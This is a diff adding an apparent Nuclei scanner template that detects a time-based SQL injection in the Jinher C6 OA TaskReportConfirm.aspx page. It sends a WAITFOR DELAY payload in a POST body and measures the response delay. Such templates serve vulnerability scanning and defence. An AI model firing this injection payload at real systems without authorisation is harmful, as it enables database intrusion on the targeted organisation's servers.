@@ -1,0 +1,52 @@
+id: poc-yaml-jinher-taskreportconfirm-aspx-sqli
+info:
+  name: "金和C6 TaskReportConfirm.aspx SQL Injection"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    vendor: "金和OA"
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "check-page"
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: "sqli-check"
+    method: POST
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=3'WAITFOR DELAY'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "汇报确认"
+          - "同时通知任务查看人"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
